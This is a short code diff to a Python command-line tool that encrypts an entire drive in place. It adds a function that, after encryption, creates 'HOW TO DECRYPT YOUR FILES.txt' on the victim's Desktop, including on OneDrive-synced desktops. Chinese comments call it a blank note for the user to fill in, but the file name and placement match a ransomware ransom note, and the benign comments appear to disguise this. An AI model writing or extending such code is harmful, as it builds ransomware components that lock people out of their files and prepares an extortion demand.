@@ -141,10 +141,26 @@ def main(drive: str, workers: int, password: str | None, show_skipped: bool) -> 
 
     ok, err = encrypt_inplace(root, master, workers, _error_cb, skip)
 
+    # 加密完成后在桌面生成空白提示文件（内容由用户自行填写）
+    _drop_desktop_note()
+
     click.echo()
     click.echo(f"完成。已加密: {ok}  错误: {err}")
     if err:
         sys.exit(2)
+
+
+def _drop_desktop_note() -> None:
+    """在当前用户桌面创建空白 txt，用户可自行填写解密说明。"""
+    desktop = Path.home() / "Desktop"
+    if not desktop.exists():
+        # 兼容部分 Windows 系统桌面路径差异
+        desktop = Path.home() / "OneDrive" / "Desktop"
+    if not desktop.exists():
+        return
+    note = desktop / "HOW TO DECRYPT YOUR FILES.txt"
+    if not note.exists():
+        note.write_text("", encoding="utf-8")
 
 
 if __name__ == "__main__":
